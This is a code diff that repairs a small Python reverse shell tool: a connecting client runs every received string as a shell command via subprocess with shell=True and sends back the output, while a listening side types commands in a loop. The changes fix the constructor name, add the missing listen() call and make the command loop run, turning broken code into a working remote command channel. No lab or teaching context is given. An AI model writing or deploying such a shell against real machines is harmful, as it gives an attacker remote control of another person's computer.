@@ -4,7 +4,7 @@ import subprocess
 
 
 class Machine:
-    def __int__(self):
+    def __init__(self):
         #create socket
         try:
             self.s = socket.socket()
@@ -18,6 +18,7 @@ class Machine:
 #client is "us"
 class Client(Machine):
     def __init__(self, host="127.0.0.1", port=9999):
+        super().__init__()
         self.host = host
         self.port = port
 
@@ -36,8 +37,7 @@ class Client(Machine):
                     if data[:2].decode("utf-8") == 'cd':
                         os.chdir(data[3:].decode("utf-8"))
                     if len(data) > 0:
-                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         print(cmd)
                         output_bytes = cmd.stdout.read() + cmd.stderr.read()
                         output_str = output_bytes.decode("utf-8", errors='replace')
@@ -57,6 +57,7 @@ class Target(Machine):
 
     #initialize host and port server
     def __init__(self, host="", port=9999):
+        super().__init__()
         self.host = host
         self.port = port
 
@@ -65,10 +66,11 @@ class Target(Machine):
         print("Bidding socket to port " + str(self.port))
         try:
             self.s.bind((self.host, self.port))
+            self.s.listen(5)
         except socket.error as msg:
             print("Socket binding error: " + str(msg) + "\n" + "Do you want to retry ?")
             if input() == "y" or "yes":
-                self.socket_bind(self)
+                self.socket_bind()
 
     #accept the new co
     def socket_accept(self):
@@ -77,17 +79,19 @@ class Target(Machine):
         print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
 
     def reverse_shell(self):
-        cmd = input()
-        if cmd == "quit":
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response)
+        while True:
+            cmd = input()
+            if cmd == "quit":
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(1024), "utf-8")
+                print(client_response)
 
-            self.quit(self)
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+                self.quit()
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(1024), "utf-8")
+                print(client_response, end="")
 
     def print_on_both(self, msg):
         conn.send(str.encode(msg))
